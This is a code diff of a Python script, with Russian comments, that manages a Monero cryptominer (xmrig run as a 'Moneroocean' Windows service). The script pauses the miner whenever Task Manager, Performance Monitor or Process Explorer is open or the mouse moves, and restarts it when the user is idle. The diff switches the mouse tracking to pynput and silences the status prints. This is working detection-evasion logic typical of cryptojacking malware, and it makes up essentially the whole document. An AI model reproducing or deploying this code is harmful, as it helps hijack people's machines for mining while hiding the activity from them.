@@ -1,24 +1,29 @@
 import psutil
 import time
 import subprocess
-from ctypes import windll, Structure, c_ulong, byref, c_ushort
+# from ctypes import windll, Structure, c_ulong, byref, c_ushort
+from pynput.mouse import Controller
 
 SOFTS_NAME = ['Taskmgr.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe']
 SERVICE_NAME = 'Moneroocean'
 MINER_NAME = ['xmrig.exe']
 
 
-class POINT(Structure):
-    _fields_ = [("x", c_ulong), ("y", c_ulong)]
-
-VK_LBUTTON = 0x01               # Left mouse button
-VK_RBUTTON = 0x02               # Right mouse button
+# class POINT(Structure):
+#     _fields_ = [("x", c_ulong), ("y", c_ulong)]
 
 
-def queryMousePosition():
-    pt = POINT()
-    windll.user32.GetCursorPos(byref(pt))
-    return {"x": pt.x, "y": pt.y}
+mouse = Controller()
+
+
+# def queryMousePosition():
+#
+#     print('The current pointer position is {0}'.format(
+#         ))
+#
+#     pt = POINT()
+#     windll.user32.GetCursorPos(byref(pt))
+#     return {"x": pt.x, "y": pt.y}
 
 
 def find_procs_by_name(name):
@@ -32,9 +37,9 @@ def find_procs_by_name(name):
 
 
 while True:
-    mouse_position = queryMousePosition()
+    mouse_position = mouse.position
     time.sleep(0.5)
-    current_mouse_position = queryMousePosition()
+    current_mouse_position = mouse.position
     s = psutil.win_service_get(SERVICE_NAME)
     # print(s.as_dict()['status'])
     if find_procs_by_name(SOFTS_NAME) or current_mouse_position != mouse_position:
@@ -49,14 +54,9 @@ while True:
     else:
         # print('He 3апущен диспетчер задач')
         if not find_procs_by_name(MINER_NAME):
-            print('майнер не запущен - запускаю')
-            print(not find_procs_by_name(MINER_NAME))
+            # print('майнер не запущен - запускаю')
+            # print(not find_procs_by_name(MINER_NAME))
             subprocess.call(['sc', 'start', SERVICE_NAME])
         else:
             # print('майнер запущен - ничего не делаю')
             pass
-
-
-
-
-
